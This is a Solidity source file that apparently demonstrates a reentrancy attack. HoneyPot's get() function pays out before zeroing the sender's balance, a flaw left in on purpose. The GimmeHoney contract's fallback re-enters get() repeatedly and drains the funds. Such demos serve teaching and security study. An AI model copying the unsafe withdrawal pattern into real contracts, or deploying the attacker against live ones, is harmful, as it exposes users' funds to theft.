pragma solidity 0.5.8;

contract HoneyPot {
  mapping (address => uint) public balances;

  event LogPut(address indexed who, uint howMuch);
  event LogGot(address indexed who, uint howMuch);

  constructor() payable public {
    put();
  }

  function put() payable public {
    emit LogPut(msg.sender, msg.value);
    balances[msg.sender] = msg.value;
  }

  function get() public {
    emit LogGot(msg.sender, balances[msg.sender]);
    (bool success,) = msg.sender.call.value(balances[msg.sender])("");
    require(success);
    balances[msg.sender] = 0;
  }

  function() external {
    revert();
  }
}

contract GimmeHoney {
  HoneyPot public honeypot;

  constructor(address _honeypot) public {
    honeypot = HoneyPot(_honeypot);
  }

  function collect() external payable {
    honeypot.put.value(msg.value)();
    honeypot.get();
  }

  function() external payable {
    if (address(honeypot).balance >= msg.value) {
      honeypot.get();
    }
  }
}

